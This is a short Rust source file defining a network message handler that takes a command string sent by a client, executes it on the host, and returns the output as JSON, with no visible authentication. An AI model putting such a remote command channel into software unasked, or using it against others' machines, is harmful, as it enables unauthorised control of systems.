use crate::client_handlers::def_handler::SubHandle;
use async_std::sync::Arc;
use std::sync::Mutex;
use crate::utils::rcmd::*;
use crate::ext_code::*;

pub struct Exec
{
    rcmd:Arc<Mutex<Rcmd>>
}

impl Exec {
    pub fn new()->Exec
    {
        Exec{
            rcmd:Arc::new(Mutex::new(Rcmd::new()))
        }
    }
}

impl SubHandle for Exec
{
    fn handle(&self, data: &[u8], len: u32, ext: u32) -> Option<(Vec<u8>, u32)> {
        if ext == EXT_EXEC_CMD {
            let cmd = String::from_utf8_lossy(data).to_string();
            if let Ok(mut r) = self.rcmd.lock()
            {
                let res = match r.exec_ex(cmd)
                {
                    Ok(v) => {
                        v
                    }
                    Err(e) => {
                       CmdRes::err_str(e)
                    }
                };

                if let Ok(r) = serde_json::to_string(&res){
                    return Some((r.into_bytes(),EXT_EXEC_CMD));
                }else{
                    return Some((vec![],EXT_ERR_EXEC_CMD_NOT_KNOW));
                };
            }
        }
        None
    }
}